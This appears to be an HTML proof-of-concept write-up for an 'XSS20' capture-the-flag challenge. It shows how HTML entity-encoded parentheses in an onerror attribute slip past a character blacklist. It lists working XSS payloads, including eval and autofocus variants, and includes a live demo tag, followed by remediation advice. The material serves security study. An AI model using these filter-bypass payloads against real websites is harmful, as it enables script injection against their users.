<!DOCTYPE html>
<html>
<head>
    <title>XSS20 Challenge - Bypass POC</title>
</head>
<body>
    <h1>XSS Challenge 20 - Blacklist Bypass</h1>
    <p>This POC demonstrates bypassing the XSS20 filter using HTML entity encoding for parentheses.</p>
    
    <h2>Filter Constraints:</h2>
    <ul>
        <li>Blacklisted characters: &lt;, &gt;, (, ), throw, `, ´, javascript (case insensitive)</li>
        <li>Input format: &gt;&lt;img src="USER_INPUT"</li>
        <li>Goal: Execute JavaScript alert('XSS')</li>
    </ul>
    
    <h2>Bypass Technique: HTML Entity Encoding</h2>
    <p>The blacklist filters characters in the user input BEFORE rendering. By using HTML entity codes for parentheses, we can bypass the filter:</p>
    <ul>
        <li>&#40; represents '('</li>
        <li>&#41; represents ')'</li>
        <li>&#x28; represents '(' (hex)</li>
        <li>&#x29; represents ')' (hex)</li>
    </ul>
    
    <h2>Payload:</h2>
    <code>" onerror="alert&#x28;1&#x29;</code>
    
    <h2>Generated HTML:</h2>
    <pre>&lt;input type=text name=name placeholder="Enter your name..." &gt;&lt;img src="" onerror="alert&#x28;1&#x29;"&gt;</pre>
    
    <h2>Execution Flow:</h2>
    <ol>
        <li>User input: " onerror="alert&#x28;1&#x29;</li>
        <li>Filter check: No &lt;, &gt;, (, ), throw, `, ´, or javascript found → PASS</li>
        <li>HTML rendered: Browser decodes entities</li>
        <li>HTML becomes: &lt;img src="" onerror="alert(1)"&gt;</li>
        <li>Image tag fails to load (src="" is invalid)</li>
        <li>onerror event fires</li>
        <li>JavaScript executes: alert(1)</li>
    </ol>
    
    <h2>Live Demonstration:</h2>
    <p>The input below will trigger XSS when the onerror event fires (click button to trigger):</p>
    
    <form id="demoForm" onsubmit="return false;">
        <input type=text id="demoInput" name=name placeholder="Enter your name..." ><img id="demoImg" src="" onerror="alert&#x28;'XSS Bypassed: This is from onerror event!'&#x29;">
        <button onclick="document.getElementById('demoImg').onerror()">Trigger XSS (simulated)</button>
    </form>
    
    <h2>Alternative Payloads:</h2>
    <ul>
        <li>Decimal encoding: " onerror="alert&#40;1&#41;</li>
        <li>Hex encoding: " onerror="alert&#x28;1&#x29;</li>
        <li>Mixed encoding: " onerror="eval&#x28;'alert&#x281&#x29;'&#x29;</li>
        <li>With autofocus: '" autofocus onerror="alert&#x28;1&#x29;</li>
    </ul>
    
    <h2>Why This Works:</h2>
    <ol>
        <li>The filter checks the RAW user input for blacklisted strings</li>
        <li>HTML entities like &#x28; are NOT in the blacklist</li>
        <li>The browser RENDERS and decodes the entities AFTER the filter</li>
        <li>Result: Malicious characters bypass the filter and execute in the browser</li>
    </ol>
    
    <h2>Remediation:</h2>
    <ol>
        <li>Use output encoding, not input filtering</li>
        <li>HTML-encode all user input before rendering</li>
        <li>Use Content Security Policy (CSP)</li>
        <li>Avoid constructing HTML attributes with user input</li>
        <li>Use templating engines with auto-escaping</li>
    </ol>
</body>
</html>
